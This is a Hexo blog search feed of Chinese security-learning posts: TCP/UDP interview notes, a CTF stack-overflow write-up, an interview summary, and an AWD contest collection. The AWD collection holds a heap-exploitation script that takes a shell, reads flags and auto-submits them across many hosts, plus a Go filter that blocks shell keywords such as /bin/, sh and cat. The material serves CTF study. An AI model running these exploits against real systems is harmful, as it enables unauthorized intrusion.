<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>【面试】UDP通信原理</title>
      <link href="/2025/03/17/%E3%80%90%E9%9D%A2%E8%AF%95%E3%80%91UDP%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/"/>
      <url>/2025/03/17/%E3%80%90%E9%9D%A2%E8%AF%95%E3%80%91UDP%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>UDP  属于传输层协议。UDP 协议的主要作用是将数据压缩成数据包的形式。</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250317205548870.png" alt="image-20250317205548833"></p><p>UDP 是一种无连接的协议，它提供简单的、不可靠的通信服务。</p><p>UDP 协议的通信较 TCP 简单了很多，减少了 TCP 的握手、确认、窗口、重传、拥塞控制等机制，UDP 是一个无状态的传输协议。</p><p>UDP 客户端在发送数据时并不判断主机是否可达，服务器是否开启等问题，同样它不能确定数据是否成功送达服务器。它只是将数据简单的封了一个包，之后就丢出去了。</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250317205553227.png" alt="image-20250317205553148"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【面试】TCP通信原理</title>
      <link href="/2025/03/17/%E3%80%90%E9%9D%A2%E8%AF%95%E3%80%91TCP%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/"/>
      <url>/2025/03/17/%E3%80%90%E9%9D%A2%E8%AF%95%E3%80%91TCP%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250317205345077.png" alt="image-20250317205345021"></p><p>TCP：TCP 是一种面向连接的协议，它提供可靠的、有序的、基于字节流的通信服务。TCP 通过三次握手建立连接，通过四次挥手关闭连接。（传输层，提供端到端的通信服务。）</p><h2 id="TCP三次握手校验"><a href="#TCP三次握手校验" class="headerlink" title="TCP三次握手校验"></a>TCP三次握手校验</h2><p>TCP 的<a href="https://zhida.zhihu.com/search?content_id=10518772&content_type=Article&match_order=1&q=%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B&zhida_source=entity">三次握手</a>，意思就是建立连接的时候客户端与服务器之间需要三次数据包的交流。</p><p>ACK：确认序号标志，为1时表示确认号有效，为0表示报文中不含确认信息，忽略确认号字段。</p><p>SYN：同步序号，用于建立连接过程</p><ol><li>客户端发送给服务器一个请求连接数据包，即发送了一个指向服务器目标端口的一个 SYN 位为 1 的TCP 报文。</li><li>服务器接收到客户端的连接请求之后，会回应一个 SYN 位为 1 的TCP 报文，表示同意连接。并且，会把 ACK 位也置 1 表示确认收到上次消息。</li><li>客户端接收到服务器的同意连接的数据包之后，还要回复一个 ACK 为 1 的 TCP 报文，表示确认收到。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250317205351274.png" alt="image-20250317205351223"></p><h2 id="TCP四次挥手断开连接"><a href="#TCP四次挥手断开连接" class="headerlink" title="TCP四次挥手断开连接"></a>TCP四次挥手断开连接</h2><p>TCP 的<a href="https://zhida.zhihu.com/search?content_id=10518772&content_type=Article&match_order=1&q=%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B&zhida_source=entity">四次挥手</a>，意思就是释放连接的时候客户端与服务器之间需要四次数据包的交流。</p><ol><li>客户端发送给服务器一个请求释放连接的数据包，即发送了一个指向服务器目标端口的一个 FIN 位为 1 的TCP 报文，表示客户端没有数据要发送了，但是仍然可以接收数据；并且 ACK 位也为 1，表示对上次传输数据结果的确认。并且之后处去等待状态，等待服务器的两次回应。</li><li>服务器接收到客户端的释放连接请求之后，会先回应一个 ACK 位为 1 的报文，表示确认收到。但是，这时服务器可能还有数据没有发送完成，继续发送数据。</li><li>服务器发送完数据之后，发送一个 FIN 为 1 的 TCP 报文，表示我也没有要发送的数据了，你可以释放连接了。当然 ACK 位仍然为 1 。</li><li>客户端接收到服务器的同意释放连接的数据包之后，回复一个 ACK 为 1 的 TCP 报文，表示确认收到。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250317205357557.png" alt="image-20250317205357506"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWD-Pwn脚本汇总</title>
      <link href="/2025/03/15/AWD-Pwn%E8%84%9A%E6%9C%AC%E6%B1%87%E6%80%BB/"/>
      <url>/2025/03/15/AWD-Pwn%E8%84%9A%E6%9C%AC%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<p>今天在整理语雀知识库的时候，整理之前参加awd的时候的脚本。</p><p>那时候pwn没咋学，总结一下：</p><p>（后面如果有机会还会在传）</p><h2 id="自动get-ip脚本"><a href="#自动get-ip脚本" class="headerlink" title="自动get ip脚本"></a>自动get ip脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">&#x27;url.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">        url=<span class="string">&quot;127.0.&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;.1:9999\n&quot;</span></span><br><span class="line">        f.write(url)</span><br></pre></td></tr></table></figure><h2 id="自动攻击-提交"><a href="#自动攻击-提交" class="headerlink" title="自动攻击+提交"></a>自动攻击+提交</h2><p>pip install request</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#攻击函数，可以自定义</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">host,port</span>):</span><br><span class="line">    context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,timeout=<span class="number">30</span>)</span><br><span class="line">    <span class="comment"># context.log_level=&quot;DEBUG&quot;     p=remote(host,port)</span></span><br><span class="line"></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    elf=ELF(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p,&quot;b *0x400bd0&quot;)     newpost(p,&quot;AAAAAA&quot;)#0     newpost(p,&quot;BBBBBBB&quot;)#1     unsort(p,&quot;6666666&quot;) #2     newpost(p,&quot;hhhhh&quot;) #3 0x6020b8     #pause()     delete(p,&quot;2&quot;)</span></span><br><span class="line">    newpost(p,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    show(p)</span><br><span class="line">    libc.address=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>,timeout=<span class="number">3</span>)[-<span class="number">6</span>: ] + <span class="string">&#x27;\0\0&#x27;</span>)-  <span class="number">250</span>-<span class="number">0x3c4b10</span></span><br><span class="line">    success(<span class="string">&quot;libc -&gt; &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(libc.address))</span><br><span class="line"></span><br><span class="line">    delete(p,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    delete(p,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    delete(p,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="comment"># pause()     newpost(p,p64(0x60208d))</span></span><br><span class="line">    <span class="comment"># pause() </span></span><br><span class="line">    newpost(p,<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()     newpost(p,&quot;&quot;)</span></span><br><span class="line">    ioaddr=<span class="number">0x7f55aab438e0</span>-<span class="number">0x7f55aa77f000</span></span><br><span class="line">    <span class="comment">####test # newpost(p,&quot;&quot;) # pause()     ####test     newpost(p,&#x27;qrstuvwxyz&#x27;+&quot;ABCDEFGHIJKLMNOPQ&quot;+p64(0x602018))</span></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter the Index:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    content=p64(libc.address+<span class="number">283536</span>)[:-<span class="number">1</span>]</span><br><span class="line">    p.sendafter(<span class="string">&quot;Enter the Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#edit(&quot;4&quot;,&quot;/bin/sh&quot;)     #pause()     delete(p,&quot;6&quot;)</span></span><br><span class="line">    p.sendline(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">    flag=p.recvline()</span><br><span class="line">    p.close()<span class="comment">##！！！！！！！！！！！！！！！！！！！！！重要     return flag</span></span><br><span class="line">    <span class="comment">#################这些都不重要################################################### def newpost(p,content):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter the Content:&quot;</span>,content)</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">p,index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter the Index:&quot;</span>,index)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter the Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">p,index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter the Index:&quot;</span>,index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice:&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unsort</span>(<span class="params">p,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice:&quot;</span>,<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter the Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#自动提交flag</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>(<span class="params">flag, token</span>):</span><br><span class="line">    url = <span class="string">&quot;xxxx&quot;</span></span><br><span class="line">    pos = &#123;</span><br><span class="line">        <span class="string">&quot;flag&quot;</span>:flag,</span><br><span class="line">        <span class="string">&quot;token&quot;</span>:token</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Submiting flag : [%s]&quot;</span> % (pos)</span><br><span class="line">    response = requests.post(url,data=data)</span><br><span class="line">    content = response.content</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Content : %s &quot;</span> % (content)</span><br><span class="line">    <span class="keyword">if</span> failed <span class="keyword">in</span> content:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[-]failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[+] Success!&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">host,port</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="comment">#pwn是攻击函数</span></span><br><span class="line">flag = pwn(host,port)</span><br><span class="line"><span class="comment">#提交flag的submit函数</span></span><br><span class="line">submit(flag,token)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> m:</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit_it</span>():</span><br><span class="line"><span class="comment">#打开目标</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;url.txt&quot;</span>) <span class="keyword">as</span> f :</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line"><span class="comment">#分割ip和端口</span></span><br><span class="line">host = line.split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">port = <span class="built_in">int</span>(line.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Exploiting:%s:%d&quot;</span> % (host,port))</span><br><span class="line"><span class="comment">#执行攻击脚本</span></span><br><span class="line">exploit(host,port)</span><br></pre></td></tr></table></figure><h2 id="pwnwaf-go语言版"><a href="#pwnwaf-go语言版" class="headerlink" title="pwnwaf-go语言版"></a>pwnwaf-go语言版</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;bufio&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">    <span class="string">&quot;os/exec&quot;</span></span><br><span class="line">    <span class="string">&quot;regexp&quot;</span></span><br><span class="line">    <span class="string">&quot;strconv&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">//他大概的功能是匹配关键命令，替换为空，匹配flag文件，返回空内容。并将过程写入日志</span><br><span class="line">var wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line">const (</span><br><span class="line">    pwnPath = <span class="string">&quot;./tmp/nysec&quot;</span>  //替换为要保护的pwn</span><br><span class="line">    logPath = <span class="string">&quot;./tmp/pwnone_log/&quot;</span>  //替换为可读可写的 日志目录</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;该文件由Pwnwaf进行保护&quot;</span>)</span><br><span class="line">    _,err := os.Stat(logPath) //判断./tmp/nysec是否存在</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123; </span><br><span class="line">        //os.Mkdir(logPath, 0777) //如果文件夹不存在则创建文件夹</span><br><span class="line">        os.MkdirAll(logPath,0777)</span><br><span class="line">    &#125;</span><br><span class="line">    logfileName := time.Now().Format(<span class="string">&quot;15_04_05&quot;</span>) + <span class="string">&quot;_&quot;</span> + strconv.FormatInt(time.Now().UnixNano() / <span class="number">1e6</span>,<span class="number">10</span>) + <span class="string">&quot;.log&quot;</span></span><br><span class="line">    //time.Now().Format(<span class="string">&quot;15_04_05&quot;</span>)获取当前时间格式化当前时间</span><br><span class="line">    //strconv.FormatInt(time.Now().UnixNano() / <span class="number">1e6</span>,<span class="number">10</span>)：相当于随机数，这个数随着时间的推移而增大</span><br><span class="line">    logfileName = logPath + logfileName</span><br><span class="line">    f,err := os.OpenFile(logfileName,os.O_CREATE|os.O_WRONLY, os.ModePerm)</span><br><span class="line">    //创建为logfileName的文件</span><br><span class="line">    //os.O_CREATE|os.O_WRONLY：如果文件已存在，则会覆盖写，不会清空原来的文件，而是直接从头开始覆盖</span><br><span class="line">    fwriter := bufio.NewWriter(f) //创建默认大小的缓冲区</span><br><span class="line">    defer func() &#123; //匿名函数最后执行</span><br><span class="line">        fwriter.Flush() //将缓冲区文件写入到文件中</span><br><span class="line">        f.Close()</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    pwnCmd := <span class="built_in">exec</span>.Command(pwnPath) //运行nysec文件，即运行pwn文件</span><br><span class="line">    pwnIn,_ := pwnCmd.StdinPipe() //标准输入重定向到PwnIn</span><br><span class="line">    pwnOut,_ := pwnCmd.StdoutPipe()//标准输出重定向到PwnOut</span><br><span class="line">    pwnCmd.Start() //立即执行pwn文件</span><br><span class="line">    wg.Add(<span class="number">1</span>) </span><br><span class="line">    //一个 WaitGroup 对象可以等待一组协程结束</span><br><span class="line">    //wg.Add(<span class="built_in">int</span>) 设置协程的个数，然后创建worker协程</span><br><span class="line">    go func() &#123; //创建协程--output</span><br><span class="line">        dangerExp := regexp.MustCompile(<span class="string">&quot;flag\\&#123;.*?&#125;&quot;</span>) //正则匹配</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            output := make([]byte,<span class="number">1024</span>) //创建切片</span><br><span class="line">            length,err := pwnOut.Read(output)  //将pwnOut读入到output中</span><br><span class="line">            <span class="keyword">if</span> err != nil&#123;</span><br><span class="line">                wg.Done() //协程结束后都要调用 wg.Done()；</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">            output = output[:length] //从第一个元素开始到output</span><br><span class="line">            fwriter.WriteString(<span class="string">&quot;send: \n&quot;</span>)</span><br><span class="line">            fwriter.Write(output)</span><br><span class="line">            fwriter.WriteString(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            fmt.Print(string(dangerExp.ReplaceAll(output,[]byte&#123;&#125;))) //将output中的某些特殊字符正则匹配为空</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    go func() &#123;//<span class="built_in">input</span></span><br><span class="line">        //创建正则表达式，匹配输入是否包含以下指令</span><br><span class="line">        dangerExp := regexp.MustCompile(<span class="string">&quot;/bin/|cat|flag|sh|tac|strings|head|tail|base64&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">input</span> := make([]byte,<span class="number">1024</span>)</span><br><span class="line">            length,err := os.Stdin.Read(<span class="built_in">input</span>) //读取输入</span><br><span class="line">            <span class="keyword">if</span> err != nil&#123;</span><br><span class="line">                wg.Done()</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">input</span> = <span class="built_in">input</span>[:length]</span><br><span class="line">            //将获取的输入写入文件</span><br><span class="line">            fwriter.WriteString(<span class="string">&quot;receive: \n&quot;</span>)</span><br><span class="line">            fwriter.Write(<span class="built_in">input</span>)</span><br><span class="line">            fwriter.WriteString(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            //使用空白，替换 危险的关键字，使用正则表达式</span><br><span class="line">            <span class="built_in">input</span> = dangerExp.ReplaceAll(<span class="built_in">input</span>,[]byte&#123;&#125;)</span><br><span class="line">            //替换后的输入，写入pwnIn</span><br><span class="line">            _, err = pwnIn.Write(<span class="built_in">input</span>)</span><br><span class="line">            <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">                wg.Done() //协程结束后都要调用 wg.Done()；</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    wg.Wait() //main协程调用 wg.Wait() 阻塞等待所有协程执行完毕后返回</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Pwn1】栈溢出+覆盖判断条件练习题</title>
      <link href="/2025/03/15/%E3%80%90Pwn1%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%A6%86%E7%9B%96%E5%88%A4%E6%96%AD%E6%9D%A1%E4%BB%B6%E7%BB%83%E4%B9%A0%E9%A2%98/"/>
      <url>/2025/03/15/%E3%80%90Pwn1%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%A6%86%E7%9B%96%E5%88%A4%E6%96%AD%E6%9D%A1%E4%BB%B6%E7%BB%83%E4%B9%A0%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>题目：</p><p>通过网盘分享的文件：pwn1<br>链接: <a href="https://pan.baidu.com/s/1wbcX-sBng65_mNA0vrIKqQ?pwd=1234">https://pan.baidu.com/s/1wbcX-sBng65_mNA0vrIKqQ?pwd=1234</a> 提取码: 1234<br>（手机打开转存效果更佳）</p><p>知识点：栈溢出理解</p><p>先来复习一下，栈的结构和参数存储的位置</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142713291.png" alt="image-20250315142713100"></p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142722955.png" alt="image-20250315142722818"></p><p>把a1替换为0x61616161</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142727498.png" alt="image-20250315142727399"></p><p>gets() 函数不会限制用户输入的数据长度，而变量 s 的大小不是无限的</p><p>s输入的目的是替换 a1的值，将 a1 改写为 0x61616161，让if判断成立。</p><p>我们知道函数参数在栈中是在EIP（返回地址）的上面（地址的上面，高地址）</p><p>现在我们选择使用cyclic去预判（IDA有时候显示的不准确，汇编层面可以看s局部变量存储方式，如果是带有ebp寄存器参与可能显示不准确）</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142732202.png" alt="image-20250315142732088"></p><p>cyclic结合gdb的方式</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142737462.png" alt="image-20250315142737323"></p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142743303.png" alt="image-20250315142743209"></p><p>‘A’*28 + EBP值替换 + 返回地址(EIP) + 0x61616161</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p= process(<span class="string">&#x27;./pwn0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#局部变量 + ESP + EIP + 替换a1函数参数</span></span><br><span class="line">shell_code=<span class="string">b&#x27;A&#x27;</span>*<span class="number">28</span>+<span class="string">b&#x27;s&#x27;</span>*<span class="number">4</span>+<span class="string">b&#x27;e&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x61616161</span>)</span><br><span class="line"></span><br><span class="line">p.sendline()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025腾讯面试一面总结</title>
      <link href="/2025/03/14/2025%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95%E4%B8%80%E9%9D%A2%E6%80%BB%E7%BB%93/"/>
      <url>/2025/03/14/2025%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95%E4%B8%80%E9%9D%A2%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>面试岗位：做安全正向防护sdk的，web和移动端都有</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250314111104988.png" alt="Snipaste_2025-03-14_10-46-52"></p><p>大概面了40分钟，写代码写了20分钟</p><h2 id="1、自我介绍"><a href="#1、自我介绍" class="headerlink" title="1、自我介绍"></a>1、自我介绍</h2><p>巴拉巴拉告诉自己擅长什么，打算干啥</p><h2 id="2、介绍自己的项目经历（根据项目经历来问）"><a href="#2、介绍自己的项目经历（根据项目经历来问）" class="headerlink" title="2、介绍自己的项目经历（根据项目经历来问）"></a>2、介绍自己的项目经历（根据项目经历来问）</h2><p>Android 渗透印象最深刻的漏洞？</p><p>360免费版和360企业版主要的区别？</p><p>Frida检测如何绕过？</p><p>如果你是正向人员，如何隐藏Frida检测？</p><p>Android ROM魔改的思路？</p><p>APP脱壳思路？</p><p>SVC 检测绕过的方式？</p><p>小程序调试的思路？</p><p>web防护知道吗？我回答没了解太多（可以委婉一点，说自己学习能力强）</p><p>目前在学校学习那些课程？我说课程全是水课，我自己在学pwn、Android和web</p><h2 id="3、八股文"><a href="#3、八股文" class="headerlink" title="3、八股文"></a>3、八股文</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 